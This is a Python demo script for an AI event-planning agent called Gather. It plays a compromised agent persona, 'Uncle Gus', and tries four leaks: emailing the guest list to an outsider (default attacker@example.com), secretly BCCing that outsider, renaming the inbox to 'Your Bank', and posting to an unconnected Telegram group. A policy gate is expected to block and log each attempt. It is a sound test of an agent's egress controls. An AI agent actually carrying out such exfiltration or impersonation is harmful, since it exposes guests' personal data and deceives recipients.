"""Demo: play a compromised Uncle Gus and try to leak the guest list.

    python3 -m scripts.try_escape someone@example.com

Run on the AGENT Sprite. With the policy gate on, every attempt is refused by
a different machine, and shows up on the dashboard and in the gate's audit log.
"""
import sys

from gather import config, gateway, store
from gather.channels import email, telegram


def attempt(label: str, fn) -> None:
    try:
        fn()
        print(f"  [LEAKED]  {label}")
    except gateway.PolicyBlocked as exc:
        print(f"  [BLOCKED] {label}\n            gate says: {exc}")
        store.flag("blocked", f"Demo: the policy gate refused '{label}' ({exc})")
    except Exception as exc:
        print(f"  [FAILED]  {label}: {exc}")


def main() -> None:
    outsider = sys.argv[1] if len(sys.argv) > 1 else "attacker@example.com"
    store.init()
    event = store.current_event()
    guests = store.guests(event["id"]) if event else []
    leak = "Guest list: " + ", ".join(f"{g['name']} <{g['email']}>" for g in guests if g["email"])
    print(f"Gate: {'ON at ' + config.gate_url() if config.agentmail_base().startswith('gate:') else 'OFF (sending directly!)'}")
    print("Pretending Uncle Gus has been tricked into leaking the guest list...\n")
    attempt(f"email the guest list to {outsider}", lambda: email.send(outsider, "Guest list", leak))
    if guests and guests[0]["email"]:
        attempt("bcc an outsider on a guest's email",
                lambda: gateway.call("POST", config.agentmail_base(),
                                     f"/v0/inboxes/{gateway.quote(config.inbox_id())}/messages/send",
                                     body={"to": guests[0]["email"], "bcc": outsider,
                                           "subject": "Hi", "text": "Hello!"}))
    attempt("rename Gather's inbox to look like someone else",
            lambda: gateway.call("PATCH", config.agentmail_base(),
                                 f"/v0/inboxes/{gateway.quote(config.inbox_id())}",
                                 body={"display_name": "Your Bank"}))
    attempt("post in a Telegram group the host never connected",
            lambda: telegram.send(-1000000000001, leak))
    print("\nCheck the dashboard: each attempt is listed under Needs you and counted by the policy gate.")


if __name__ == "__main__":
    main()
